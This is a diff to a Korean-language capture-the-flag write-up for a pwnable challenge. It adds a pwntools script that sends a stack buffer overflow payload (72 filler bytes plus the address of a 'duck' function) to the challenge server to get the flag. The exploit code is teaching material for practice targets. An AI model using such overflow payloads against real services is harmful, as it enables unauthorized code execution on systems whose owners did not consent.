@@ -58,6 +58,25 @@ IBT:        Enabled
 4. PIE 비활성이므로 정적 심볼 주소 사용이 가능하다. 내 출력 기준 `duck = 0x40128c`다.
 5. `payload = b"A"*72 + p64(0x40128c)`다.
 6. 원격 서비스 배너 `The Ducks are coming!` 수신 후 페이로드를 보낸다. 성공하면 플래가 나온다.
+```python
+from pwn import *
+
+host = "chall.v1t.site"
+port = 30210
+p = remote(host, port)
+
+duck_addr = 0x40128c
+payload = b"A" * 72 + p64(duck_addr)
+
+p.recvuntil("The Ducks are coming!")
+p.sendline(payload)
+print(p.recvuntil(b"FLAG: ", timeout=5).decode(errors="ignore"))
+print(p.recvline(timeout=5).decode(errors="ignore"))
+p.close()
+```
+
 
 
 ## Solved
+![](image1.png)
+포너블이 전체적으로 좀 쉽게 출제됐다.
